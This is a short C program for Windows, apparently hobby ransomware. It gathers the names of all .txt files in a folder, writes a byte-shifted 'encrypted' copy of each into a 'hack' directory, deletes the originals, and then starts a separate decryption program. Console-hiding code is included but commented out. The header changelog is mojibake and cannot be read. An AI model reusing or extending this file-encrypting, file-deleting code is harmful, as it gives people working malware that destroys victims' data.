/*
���:2020/12/4 
�@��:HiCat
���e:�������áB��Ƨ������Otxt�ɦW���ɮ׷j���C

���:2020/12/6
�@��:HiCat
���e:�R�����õ������\��B�ѨM�����ɮ׫�|�L�k������x�{�����c��BUG(BUG-001)�B����Ū���n�[�K�ɮת��\��B��²�F�y�k�B��¦�[�K�{�ǧ����B�ѱK�{�ǻs�@���C

����G2020/12/12
�@�̡GHiCat
���e�Gbeta�{���s�@�����A�o�{Bug-002(�p�G�ɮצW���Ů檺�ܵL�k�[�K)�w�ѨM�C
*/
#include <stdio.h>
#include <stdlib.h> 
#include <string.h>
#define _WIN32_WINNT_WIN32_WINNIT_WINN2K 0x0500
#include <windows.h>

void txt_file(void){
  //�Ыظ�Ƨ��M�Ҧ�txt�ɪ��ɦW 
  system("dir /B *.txt >> hack/hack.txt");
}

char encryption(FILE *fptr1, FILE *fptr2){
  char ch;
  while(1)
    {
        ch = fgetc(fptr1);
        if(ch == EOF)
        {
            break;
        }
        else
        {
            ch = ch - (8 * 5 - 3);
            fputc(ch, fptr2);
        }
    }
}

void file_read_hackTXT(void){
  //Ū�� 
  FILE *fptr1, *fptr2;//1:�n�[�K���ɮסB2:�[�K��r���ɮ�
  char file1[1000];
  
  while(1){
    txt_file();
    fptr1 = fopen("hack/hack.txt", "r");
    fgets(file1, 1000, fptr1);
    strtok(file1, "\n");
    fclose(fptr1);
    remove("hack/hack.txt");
    fptr1 = fopen(file1, "r");
    if(fptr1 == NULL){//�˴��ɮ׬O�_�s�b
      break;
    }
    char file2[1000] = "hack/";
    strcat(file2, file1);
    fptr2 = fopen(file2, "w");
    encryption(fptr1, fptr2);
    fclose(fptr1);
    fclose(fptr2);
    remove(file1);
  }
}

int main(void){
  //�������� 
  /*HWND hwnd = GetConsoleWindow();
  ShowWindow(hwnd, SW_MINIMIZE);
  ShowWindow(hwnd, SW_HIDE);*/
  
  //�D�{��
  system("md hack");
  file_read_hackTXT();

  system("cls");
  system("decryption_program.exe");
  system("pause");
  return 0;
}
